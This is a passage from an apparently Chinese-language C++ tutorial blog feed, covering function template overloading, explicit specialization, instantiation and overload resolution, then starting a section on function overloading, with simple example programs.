class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板版本 1: 交换两个同类型变量</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T&amp;, T&amp;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板版本 2: 交换两个数组的元素 (需要额外参数指定大小)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T arr1[], T arr2[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using Swap(T[], T[], int)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        T temp = arr1[i];</span><br><span class="line">        arr1[i] = arr2[i];</span><br><span class="line">        arr2[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 调用版本 1: Swap&lt;int&gt;(int&amp;, int&amp;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> arr_a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> arr_b[] = &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBefore swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(arr_a, arr_b, size); <span class="comment">// 调用版本 2: Swap&lt;int&gt;(int[], int[], int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter swapping arrays:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_a: &quot;</span> &lt;&lt; arr_a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_a[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;arr_b: &quot;</span> &lt;&lt; arr_b[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; arr_b[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器会根据调用时提供的参数数量和类型（包括是否是数组）来选择最匹配的重载模板。</p><h2 id="8-5-2-模板的局限性"><a href="#8-5-2-模板的局限性" class="headerlink" title="8.5.2 模板的局限性"></a>8.5.2 模板的局限性</h2><p>函数模板是通用的，但并非万能。模板代码中使用的操作（如赋值 <code>=</code>、比较 <code>&lt;</code>、<code>&gt;</code> 等）必须对实例化时使用的具体类型有效。如果某个类型不支持模板代码中的操作，那么实例化该类型的模板就会导致编译错误。</p><p><strong>示例：模板可能失败的情况</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CompareAndPrint</span><span class="params">(<span class="keyword">const</span> T&amp; a, <span class="keyword">const</span> T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) &#123; <span class="comment">// 假设类型 T 支持 &lt; 运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is less than b&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; a) &#123; <span class="comment">// 假设类型 T 支持 &lt; 运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b is less than a&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a and b are equal (or incomparable)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">// 这个结构体没有重载 &lt; 运算符</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    CompareAndPrint(x, y); <span class="comment">// OK: int 支持 &lt; 运算符</span></span><br><span class="line"></span><br><span class="line">    Data d1 = &#123;<span class="number">10</span>&#125;;</span><br><span class="line">    Data d2 = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">    <span class="comment">// CompareAndPrint(d1, d2); // 编译错误！Data 类型没有定义 operator&lt;</span></span><br><span class="line">                               <span class="comment">// 编译器无法实例化 CompareAndPrint&lt;Data&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要解决这个问题，可以为 <code>Data</code> 结构重载 <code>&lt;</code> 运算符，或者使用下一节将介绍的<strong>显式具体化</strong>。</p><h2 id="8-5-3-显式具体化-Explicit-Specialization"><a href="#8-5-3-显式具体化-Explicit-Specialization" class="headerlink" title="8.5.3 显式具体化 (Explicit Specialization)"></a>8.5.3 显式具体化 (Explicit Specialization)</h2><p>有时，通用的函数模板对于某个特定类型可能不适用或效率不高，我们希望为这个特定类型提供一个专门的、非模板的实现。这就是<strong>显式具体化</strong>。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;&gt; <span class="comment">// 空的尖括号表示这是一个具体化</span></span><br><span class="line">return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123;</span><br><span class="line">    <span class="comment">// 针对 specific_type 的特殊实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;&gt;</code>: 告诉编译器这是一个显式具体化。</li><li>  <code>function_name&lt;specific_type&gt;</code>: 在函数名后明确指定要为哪个类型提供具体化版本。</li><li>  函数体包含针对 <code>specific_type</code> 的特殊代码。</li></ul><p><strong>示例：为结构体具体化 Swap 模板</strong></p><p>假设我们有一个结构体，我们只想交换其中的某个成员，而不是整个结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Job</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">double</span> salary;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">floor</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用 Swap 模板 (同上)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using generic Swap)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 针对 Job 类型的显式具体化</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; <span class="comment">// 明确指定 T 为 Job</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using specialized Swap for Job - swapping salary and floor only)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 只交换 salary 和 floor 成员</span></span><br><span class="line">    <span class="keyword">double</span> temp_salary = j1.salary;</span><br><span class="line">    j1.salary = j2.salary;</span><br><span class="line">    j2.salary = temp_salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> temp_floor = j1.<span class="built_in">floor</span>;</span><br><span class="line">    j1.<span class="built_in">floor</span> = j2.<span class="built_in">floor</span>;</span><br><span class="line">    j2.<span class="built_in">floor</span> = temp_floor;</span><br><span class="line">    <span class="comment">// name 成员保持不变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 调用通用模板 Swap&lt;int&gt;</span></span><br><span class="line"></span><br><span class="line">    Job sue = &#123;<span class="string">&quot;Susan Yaffee&quot;</span>, <span class="number">73000.60</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    Job sid = &#123;<span class="string">&quot;Sidney Taffee&quot;</span>, <span class="number">78060.72</span>, <span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal Jobs:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(sue, sid); <span class="comment">// 调用显式具体化版本 Swap&lt;Job&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSwapped Jobs (partially):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当编译器遇到 <code>Swap(sue, sid)</code> 调用时，它发现存在一个专门为 <code>Job</code> 类型定义的显式具体化版本 <code>Swap&lt;Job&gt;</code>，于是优先选择并调用这个特殊版本，而不是通用的模板版本。</p><h2 id="8-5-4-实例化和具体化-Instantiation-and-Specialization"><a href="#8-5-4-实例化和具体化-Instantiation-and-Specialization" class="headerlink" title="8.5.4 实例化和具体化 (Instantiation and Specialization)"></a>8.5.4 实例化和具体化 (Instantiation and Specialization)</h2><p>区分这两个概念很重要：</p><ul><li><p><strong>实例化 (Instantiation):</strong> 编译器根据函数模板和调用时使用的具体类型<strong>自动生成</strong>一个特定类型的函数版本。这是模板的基本工作方式。</p><ul><li>  <strong>隐式实例化 (Implicit Instantiation):</strong> 编译器在需要时自动进行（如 <code>Swap(i, j)</code>）。</li><li><strong>显式实例化 (Explicit Instantiation):</strong> 程序员可以指示编译器<strong>立即</strong>生成特定类型的函数版本，即使还没有调用它。语法：<code>template return_type function_name&lt;specific_type&gt;(parameter_list);</code> (注意末尾的分号)。这在某些高级场景（如将模板定义放在源文件中）可能有用。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 .cpp 文件中显式实例化 Swap&lt;int&gt;</span></span><br><span class="line"><span class="keyword">template</span> <span class="keyword">void</span> Swap&lt;<span class="keyword">int</span>&gt;(<span class="keyword">int</span>&amp;, <span class="keyword">int</span>&amp;);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>具体化 (Specialization):</strong> 程序员为某个特定类型提供一个<strong>完全不同</strong>的、<strong>非模板</strong>的函数定义，以覆盖通用的模板行为。</p><ul><li>  <strong>显式具体化 (Explicit Specialization):</strong> 使用 <code>template &lt;&gt;</code> 语法为特定类型提供自定义实现（如上例中的 <code>Swap&lt;Job&gt;</code>）。</li></ul></li></ul><h2 id="8-5-5-编译器选择使用哪个函数版本"><a href="#8-5-5-编译器选择使用哪个函数版本" class="headerlink" title="8.5.5 编译器选择使用哪个函数版本"></a>8.5.5 编译器选择使用哪个函数版本</h2><p>当存在多个函数（普通函数、函数模板、模板具体化）可能匹配一个函数调用时，编译器遵循一套规则来选择最佳匹配，这个过程称为**重载解析 (Overload Resolution)**。简化规则如下：</p><ol><li> <strong>寻找完全匹配:</strong> 编译器首先查找是否存在一个非模板函数，其参数类型与调用实参完全匹配（或只需进行不重要的转换，如数组名到指针）。</li><li><strong>寻找模板匹配:</strong> 如果没有找到完全匹配的非模板函数，编译器会尝试查找函数模板。<ul><li>  <strong>查找显式具体化:</strong> 检查是否存在一个显式具体化版本，其类型与实参完全匹配。</li><li>  <strong>尝试模板实例化:</strong> 尝试通过实参推导模板参数，看是否能从通用模板生成一个匹配的实例。</li></ul></li><li><strong>选择最佳匹配:</strong><ul><li>  如果只有一个匹配项（非模板函数、显式具体化或模板实例），则选择该项。</li><li>如果存在多个匹配项：<ul><li>  <strong>非模板函数优先于模板实例:</strong> 如果一个非模板函数和一个模板实例都能匹配，通常优先选择非模板函数。</li><li>  <strong>显式具体化优先于模板实例:</strong> 如果一个显式具体化和一个通用模板实例都能匹配，优先选择显式具体化。</li><li>  <strong>更具体的模板优先:</strong> 如果有多个模板实例可以匹配（可能涉及类型转换），编译器会尝试找出“最具体”的模板（即需要较少或较不复杂的类型转换就能匹配的模板）。如果无法确定哪个最具体，则调用是**歧义的 (ambiguous)**，会导致编译错误。</li></ul></li></ul></li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 非模板函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Non-template Show(int): &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通用函数模板</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(T t)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Template Show(T): &quot;</span> &lt;&lt; t &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 显式具体化</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Show&lt;<span class="keyword">double</span>&gt;(<span class="keyword">double</span> d) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Specialized Show&lt;double&gt;: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    Show(a); <span class="comment">// 优先匹配 1 (非模板函数)</span></span><br><span class="line">    Show(b); <span class="comment">// 优先匹配 3 (显式具体化)</span></span><br><span class="line">    Show(c); <span class="comment">// 匹配 2 (通用模板实例化 Show&lt;char&gt;)</span></span><br><span class="line">    Show&lt;&gt;(a); <span class="comment">// 使用 &lt;&gt; 强制编译器只考虑模板版本，匹配 2 (通用模板实例化 Show&lt;int&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-5-6-模板函数的发展"><a href="#8-5-6-模板函数的发展" class="headerlink" title="8.5.6 模板函数的发展"></a>8.5.6 模板函数的发展</h2><p>函数模板是 C++ 泛型编程的基础。自 C++11 以来，模板功能得到了进一步增强：</p><ul><li>  <strong><code>auto</code> 返回类型推导:</strong> 允许编译器根据 <code>return</code> 语句推导函数模板的返回类型。</li><li>  <strong>可变参数模板 (Variadic Templates):</strong> 允许定义接受任意数量、任意类型参数的模板（见 18.6 节）。</li><li>  <strong>别名模板 (<code>using</code>):</strong> 可以为模板创建别名。</li><li>  <strong>Lambda 表达式:</strong> 可以创建匿名的函数对象，常与模板算法结合使用。</li><li>  <strong>Concepts (C++20):</strong> 允许对模板参数施加更明确的约束，提高了编译时错误信息的可读性，并使模板意图更清晰。</li></ul><p>函数模板是 C++ 中一个非常强大和灵活的特性，它使得编写高度通用和可重用的代码成为可能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.4 函数重载</title>
      <link href="2025/04/26/8.4_%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD/"/>
      <url>2025/04/26/8.4_%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p><strong>函数重载 (Function Overloading)</strong> 是 C++ 的一项特性，允许在<strong>同一个作用域</strong>内定义多个同名函数，只要它们的<strong>参数列表（也称为函数签名）</strong>不同即可。参数列表的不同可以体现在参数的<strong>数量</strong>、<strong>类型</strong>或<strong>顺序</strong>上。编译器会根据函数调用时提供的实参类型和数量来决定具体调用哪个重载版本。</p><p><strong>函数签名:</strong> 函数的名称和其参数列表（参数的类型、数量和顺序）共同构成了函数签名。<strong>注意：函数的返回类型不属于函数签名的一部分，不能仅凭返回类型不同来重载函数。</strong></p><p><strong>目的:</strong></p><ul><li>  允许使用相同的函数名来执行概念上相似但操作于不同数据类型或参数组合的任务。</li><li>  提高代码的可读性和易用性，用户不必为相似操作记住多个不同的函数名。</li></ul><h2 id="8-4-1-重载示例"><a href="#8-4-1-重载示例" class="headerlink" title="8.4.1 重载示例"></a>8.4.1 重载示例</h2><p>假设我们需要一个函数来打印不同类型的数据。使用函数重载，我们可以定义多个名为 <code>print</code> 的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 1: 打印 int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing int: &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 2: 打印 double</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">double</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing double: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 3: 打印字符串 (const char*)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing C-string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 4: 打印 std::string (常量引用)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing std::string: &quot;</span> &lt;&lt; s &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载版本 5: 打印两个 int</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing two ints: &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误示例：仅返回类型不同，无法重载</span></span><br><span class="line"><span class="comment">// int print(int i) &#123;</span></span><br><span class="line"><span class="comment">//     std::cout &lt;&lt; 